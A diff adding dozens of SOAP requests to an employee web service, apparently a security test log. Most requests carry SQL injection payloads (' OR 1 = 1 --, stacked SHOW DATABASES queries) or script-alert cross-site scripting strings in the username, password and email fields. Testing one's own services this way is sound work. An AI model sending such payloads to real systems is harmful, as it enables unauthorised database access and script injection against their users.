@@ -224,3 +224,351 @@
 </S:Body>
 </S:Envelope>
 
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>1' OR 1 = 1 --</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>1' OR 1 = 1 --</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>1' OR 1 = 1 -- OR '</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>1' OR 1 = 1 -- OR '</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>1" OR 1 = 1 -- OR '</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>1" OR 1 = 1 -- OR '</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>1" OR 1 = 1 -- OR '</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>1" OR 1 = 1 -- OR '</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>1' OR 1 = 1</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>1' OR 1 = 1</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>1; SELECT e FROM c WHERE tg = m; --</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>1; SELECT e FROM c WHERE tg = m; --</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>1; SHOW DATABASES; --</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>1; SHOW DATABASES; --</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>'; SHOW DATABASES; OR '</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>'; SHOW DATABASES; OR '</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>' OR 1 = 1 --</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>' OR 1 = 1 --</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>' OR 1 = 1 --</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>' OR 1 = 1 --</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>' OR 1 = 1 --</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>' OR 1 = 1 --</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:addEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmployeeTypeInputParam>
+<email>anshugoyal@gmail.com</email>
+<groupid>29</groupid>
+<password>anshu</password>
+<userid>0</userid>
+<username><script>alert("Attacked")</script></username>
+</ns2:EmployeeTypeInputParam>
+</ns2:addEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam><script>alert("Attacked")</script></ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>anshu</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>' OR 1 = 1 --</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>' OR 1 = 1 --</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>' OR 1 = 1 --</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>' OR 1 = 1 --</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>' OR 1 = 1 --</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>' OR 1 = 1 --</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>' OR 1 = 1 --</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>' OR 1 = 1 --</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:addEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmployeeTypeInputParam>
+<email>anshugoyal@gmail.com</email>
+<groupid>37</groupid>
+<password><script>alert("hi")</script></password>
+<userid>0</userid>
+<username>anshu</username>
+</ns2:EmployeeTypeInputParam>
+</ns2:addEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:addEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmployeeTypeInputParam>
+<email>anshugoyal@gmail.com</email>
+<groupid>93</groupid>
+<password>  <![CDATA[\r\n  <script language="Javascript" type="text/javascript">alert ("Got you")</script>\r\n  ]]></password>
+<userid>0</userid>
+<username>anshu</username>
+</ns2:EmployeeTypeInputParam>
+</ns2:addEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:addEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmployeeTypeInputParam>
+<email>anshugoyal@gmail.com</email>
+<groupid>75</groupid>
+<password>  <![CDATA[\r\n  <script language="Javascript" type="text/javascript">alert ("Got you")</script>\r\n  ]]></password>
+<userid>0</userid>
+<username>anshu</username>
+</ns2:EmployeeTypeInputParam>
+</ns2:addEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>' OR 1 = 1 --</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>' OR 1 = 1 --</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:addEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmployeeTypeInputParam>
+<email>anshugoyal@gmail.com</email>
+<groupid>65</groupid>
+<password>anshu</password>
+<userid>0</userid>
+<username>anshu</username>
+</ns2:EmployeeTypeInputParam>
+</ns2:addEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:addEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmployeeTypeInputParam>
+<email>anshugoyal@gmail.com</email>
+<groupid>9</groupid>
+<password><![CDATA[<script language="Javascript" type="text/javascript">alert ("Got you")</script>]]></password>
+<userid>0</userid>
+<username>anshu</username>
+</ns2:EmployeeTypeInputParam>
+</ns2:addEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:addEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmployeeTypeInputParam>
+<email>anshugoyal@gmail.com</email>
+<groupid>12</groupid>
+<password><![CDATA[<script language="Javascript" type="text/javascript">alert ("Got you")</script>]]></password>
+<userid>0</userid>
+<username>akashh</username>
+</ns2:EmployeeTypeInputParam>
+</ns2:addEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:addEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmployeeTypeInputParam>
+<email>anshugoyal@gmail.com</email>
+<groupid>46</groupid>
+<password><![CDATA[<script>alert ("Got you")</script>]]></password>
+<userid>0</userid>
+<username>anshu</username>
+</ns2:EmployeeTypeInputParam>
+</ns2:addEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:addEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmployeeTypeInputParam>
+<email>anshugoyal@gmail.com</email>
+<groupid>47</groupid>
+<password><![CDATA[<script>alert ("Got you")</script>]]></password>
+<userid>0</userid>
+<username>anshu</username>
+</ns2:EmployeeTypeInputParam>
+</ns2:addEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:addEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmployeeTypeInputParam>
+<email>anshugoyal@gmail.com</email>
+<groupid>6</groupid>
+<password><![CDATA[<script>alert ("Got you")</script>]]></password>
+<userid>0</userid>
+<username>anshu</username>
+</ns2:EmployeeTypeInputParam>
+</ns2:addEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:addEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmployeeTypeInputParam>
+<email>anshugoyal@gmail.com</email>
+<groupid>95</groupid>
+<password><![CDATA[<script>alert ("Got you")</script>]]></password>
+<userid>0</userid>
+<username>anshu</username>
+</ns2:EmployeeTypeInputParam>
+</ns2:addEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>anshu</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>anshu</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:addEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmployeeTypeInputParam>
+<email><![CDATA[<script>alert ("Got you")</script>]]></email>
+<groupid>17</groupid>
+<password>anshu</password>
+<userid>0</userid>
+<username>anshu</username>
+</ns2:EmployeeTypeInputParam>
+</ns2:addEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>anshu</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>anshu</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>anshu</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>anshu</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
